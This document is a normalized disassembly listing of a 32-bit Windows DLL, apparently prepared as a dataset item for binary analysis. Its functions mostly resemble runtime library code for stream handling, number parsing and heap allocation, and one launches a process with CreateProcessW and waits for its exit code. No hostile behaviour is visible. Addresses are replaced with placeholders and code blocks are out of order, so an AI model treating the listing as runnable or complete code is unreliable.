mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_10024583
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push edi
push esi
call sub_10024583
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_10024583
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
pop edi
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_10058950
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100612be
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_100589c0
push ebp
mov ebp esp
sub esp 0x10
push 0x18
call sub_10055606
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
call sub_10008757
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_1000bd19
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
mov esp ebp
pop ebp
retn
mov edx [ edi ]
mov [ ecx ] edx
mov edx [ edi + 0x4 ]
mov [ ecx + 0x4 ] edx
sub_10058a25
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x8 ] 0x0
jbe r-xdata
mov ecx esi
call sub_1005233d
mov esi [ esi + 0x30 ]
test esi esi
je r-xdata
mov eax [ esi + 0x8 ]
lea eax [ eax + rw-data ]
dec [ eax ]
cmp [ eax ] 0x0
jg r-xdata
pop esi
pop ebp
retn
mov ecx esi
call sub_10069ce0
push esi
call sub_1006591f
pop ecx
sub_10058a63
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x14
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ edi ]
mov esi edi
jmp r-xdata
mov [ eax ] ebx
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
inc esi
movzx eax [ esi ]
mov al [ esi ]
cmp al 0x2d
je r-xdata
mov [ ebp - 0x1 ] al
inc esi
cmp al 0x2b
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax ebx
je r-xdata
cmp eax 0x1
je r-xdata
mov [ ebp - 0x1 ] 0x2b
jmp r-xdata
xor eax eax
mov [ eax ] edi
cmp eax 0x24
jg r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jl r-xdata
mov cl 0x30
cmp eax ebx
jle r-xdata
cmp [ esi ] cl
je r-xdata
cmp eax 0x10
jne r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
cmp [ esi ] cl
jne r-xdata
mov [ ebp + 0x10 ] 0x10
cmp al 0x58
je r-xdata
cmp [ esi ] cl
je r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
inc esi
movsx eax [ esi ]
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ebx
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] ebx
call sub_10027fd7
pop ecx
push eax
mov edi r--data
push edi
call sub_10079480
add esp 0xc
cmp eax ebx
je r-xdata
add esi 0x2
cmp al 0x58
jne r-xdata
mov bl [ ebp + 0x13 ]
mov ecx [ ebp - 0x8 ]
push [ ebp + 0x10 ]
mov bl al
mov eax edi
sub bl al
mov eax ecx
imul eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
movsx ecx bl
add eax ecx
mov [ ebp - 0x8 ] eax
inc esi
movsx eax [ esi ]
push eax
call sub_10027fd7
pop ecx
push eax
push edi
call sub_10079480
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov ecx [ ebp + 0x10 ]
movsx edx [ ecx + r--data ]
mov eax esi
sub eax edx
sub eax [ ebp - 0x14 ]
js r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1 ] 0x2d
jne r-xdata
test eax eax
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x10 ] esi
jne r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
neg [ ebp - 0x8 ]
call sub_1004fd6f
mov [ eax ] 0x22
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
movsx edx bl
sub eax edx
cmp [ ebp - 0x8 ] eax
jb r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov [ eax ] esi
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x1 ] 0x2b
mov [ eax ] 0x1
xor edx edx
div ecx
cmp eax [ ebp - 0xc ]
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10058c10
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10058c60
push ebp
mov ebp esp
sub esp 0xb8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov ecx [ esi + 0x3c ]
add ecx [ esi + 0x80 ]
push ebx
lea eax [ ecx + ecx + 0x4 ]
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ esi + 0x84 ] 0x8
mov ebx eax
jb r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
lea ecx [ esi + 0x70 ]
mov ecx [ esi + 0x70 ]
jmp r-xdata
pop ebx
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
cmp eax 0x7fffffff
ja r-xdata
mov edx [ esi + 0x3c ]
mov eax [ esi + 0x80 ]
lea eax [ edx + eax + 0x2 ]
test eax eax
je r-xdata
push ecx
mov edx 0x7ffffffe
mov ecx ebx
call sub_1006c8f0
test eax eax
jns r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x80 ]
lea edx [ ecx + edx + 0x2 ]
push edi
lea edi [ ebp - 0x5c ]
mov ecx ebx
mov [ ebp - 0x58 ] edx
call sub_1006c890
test eax eax
js r-xdata
pop edi
pop ebx
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x5c ]
mov eax [ ebp - 0x58 ]
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
jns r-xdata
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x80 ]
lea edx [ ecx + edx + 0x2 ]
lea edi [ ebp - 0x64 ]
mov ecx ebx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] edx
call sub_1006c890
test eax eax
js r-xdata
mov eax [ eax ]
pop edi
pop ebx
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x5c ]
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006c8f0
test eax eax
jns r-xdata
push 0x44
lea ecx [ ebp - 0xb8 ]
push 0x0
push ecx
call sub_10079a10
add esp 0xc
xor eax eax
lea edx [ ebp - 0x74 ]
push edx
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0xb8 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push 0x0
mov [ ebp - 0xb8 ] 0x44
call [ CreateProcessW@IAT ]
test eax eax
jne r-xdata
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x28 ]
mov eax 0x121
call sub_10013830
lea edx [ ebp - 0x40 ]
mov eax 0xb0
call sub_10013830
mov eax [ ebp - 0x74 ]
push 0xffffffff
push eax
mov [ esi + 0x4c ] eax
call [ WaitForSingleObject@IAT ]
mov edx [ esi + 0x4c ]
lea ecx [ ebp - 0x60 ]
push ecx
push edx
call [ GetExitCodeProcess@IAT ]
mov eax [ ebp - 0x60 ]
mov ecx [ ebp - 0x4 ]
pop edi
mov [ esi + 0x50 ] eax
pop ebx
xor ecx ebp
xor eax eax
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x54 ]
mov eax 0x45
call sub_10013830
pop edi
pop ebx
mov eax 0x5
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10058e8b
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1001f136
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_10058f28
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_100306ed
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_10079b60
pop ecx
inc eax
sub_10058fc0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
xor edi edi
cmp esi edi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ ebx ] eax
cmp eax edi
jne r-xdata
cmp [ esi + 0x4 ] edi
je r-xdata
mov esi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
cmp esi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] edi
jne r-xdata
xor ebx ebx
mov edx [ ebp + 0x8 ]
mov [ ebx ] edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0xc ] edi
mov [ ebx + 0x10 ] edi
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x1c ] edi
mov [ ebx + 0x20 ] edi
call sub_1002aa50
jmp r-xdata
push 0x24
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ebx eax
cmp ebx edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ esi + 0x4 ] edi
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ esi ] ebx
cmp ebx edi
je r-xdata
sub_10059065
push 0x64
mov eax sub_1007f7e0
call sub_1001bb6b
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10004f60
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10051f6c
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_1003088d
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_100081b8
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_100081b8
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1005576a
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_10023e65
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea edx [ ebp - 0x48 ]
movzx eax [ esi + 0x6 ]
push [ ebp - 0x60 ]
push eax
call sub_10011224
mov edi [ ebp - 0x54 ]
push [ ebp - 0x6c ]
mov [ edi ] al
movsx eax al
push eax
push r--data
call sub_10079480
add esp 0x14
test eax eax
je r-xdata
mov ecx esi
call sub_10023e65
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] 0x0
call sub_10006560
mov eax [ ebp - 0x64 ]
push [ ebp - 0x5c ]
add eax 0x1f
mov ecx esi
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x70 ] eax
call sub_100081b8
test al al
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ ebp - 0x54 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov [ ebp - 0x50 ] 0x8
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
xor ebx ebx
push ebx
push 0x78
call sub_1003088d
add esp 0xc
cmp di ax
je r-xdata
mov ecx esi
call sub_10023e65
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp edi [ ebp - 0x70 ]
jae r-xdata
cmp [ edi ] 0x30
je r-xdata
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
mov eax [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_10041a20
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10041a20
mov eax [ ebp - 0x50 ]
call sub_1004fa89
retn
mov eax [ ebp - 0x54 ]
inc [ ebp - 0x54 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
mov edi [ ebp - 0x68 ]
test di di
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
jae r-xdata
inc edi
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x49 ] 0x1
mov ecx esi
mov [ ebp - 0x50 ] 0x10
mov [ ebp - 0x58 ] bl
call sub_1005576a
jmp r-xdata
cmp [ ebp - 0x50 ] 0x10
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push ebx
push 0x58
call sub_1003088d
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_10023e65
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax + ebx ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ edx + 0x1 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp cl [ eax + ebx ]
jne r-xdata
lea eax [ ebp - 0x2c ]
cmp [ eax + ebx ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] di
jne r-xdata
mov ecx esi
call sub_10023e65
mov ecx esi
call sub_1005576a
push [ ebp - 0x5c ]
mov ecx esi
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
inc edx
jmp r-xdata
cmp cl [ eax ]
jl r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003f510
inc ebx
inc [ eax + ebx ]
jmp r-xdata
lea eax [ ebp - 0x2c ]
sub_10059404
mov edi edi
push ebp
mov ebp esp
sub esp 0x50
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x48 ] 0x0
and [ ebp - 0x4c ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x48 ]
push edx
lea edx [ ebp - 0x4c ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004a589
add esp 0x18
push eax
lea eax [ ebp - 0x50 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_1003650a
fstp [ ebp - 0x44 ]
mov eax [ ebp - 0x4c ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
fld [ ebp - 0x44 ]
shl eax 0x2
push eax
push ecx
fstp [ esp ]
call sub_10021561
pop ecx
fstp [ ebp - 0x44 ]
pop ecx
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x50 ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
fld [ ebp - 0x44 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x20
sub_100594c4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_100793c0
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_100595d0
push 0x20
mov eax sub_1007ff58
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c1ce
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
or [ esi ] 0x1
push 0xffffffff
push 0x0
lea eax [ ebp - 0x2c ]
push eax
mov ecx ebx
call sub_1005c9a6
or [ esi ] 0x2
jmp r-xdata
mov eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi + 0x4 ] eax
call sub_1000aecf
mov eax edi
call sub_1004fa89
retn 0x24
sub_10059650
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
push ebx
mov bl [ ebp + 0x18 ]
push esi
push edi
test bl 0x1
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test bl 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
mov ecx esi
or ecx ebx
je r-xdata
mov eax [ edx ]
mov [ ebp + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov esi [ r--data ]
mov ebx [ r--data ]
mov edx [ ebp + 0x14 ]
cmp edx 0x2
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0x3c ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test edx edx
je r-xdata
test bl 0x2
jne r-xdata
test ebx ebx
jl r-xdata
test edx edx
je r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
test ebx ebx
jl r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
mov edx [ ecx + 0x10 ]
sub eax [ edx ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x10 ]
cdq
add esi eax
adc ebx edx
jmp r-xdata
jg r-xdata
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov esi [ r--data ]
mov ebx [ r--data ]
jmp r-xdata
jg r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov eax [ ecx + 0x10 ]
mov edi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
jl r-xdata
jl r-xdata
sub edi [ ebp - 0x4 ]
mov eax [ ecx + 0x30 ]
add edi esi
sub [ eax ] edi
mov eax [ ecx + 0x20 ]
add [ eax ] edi
test [ ebp + 0x18 ] 0x2
je r-xdata
cmp esi eax
ja r-xdata
sub edi [ ebp + 0x18 ]
mov eax [ ecx + 0x34 ]
add edi esi
sub [ eax ] edi
mov ecx [ ecx + 0x24 ]
add [ ecx ] edi
jmp r-xdata
cmp esi eax
ja r-xdata
mov eax [ ecx + 0x24 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
add eax edi
mov edi [ ecx + 0x24 ]
mov [ edi ] edx
mov ecx [ ecx + 0x34 ]
sub eax edx
mov [ ecx ] eax
jmp r-xdata
sub_10059809
push 0x20
mov eax sub_10080242
call sub_1001bb6b
mov eax [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x24 ]
mov ebx [ ebp + 0x28 ]
push eax
push [ ebp + 0x1c ]
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call sub_1006bd99
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003b7cf
test al al
je r-xdata
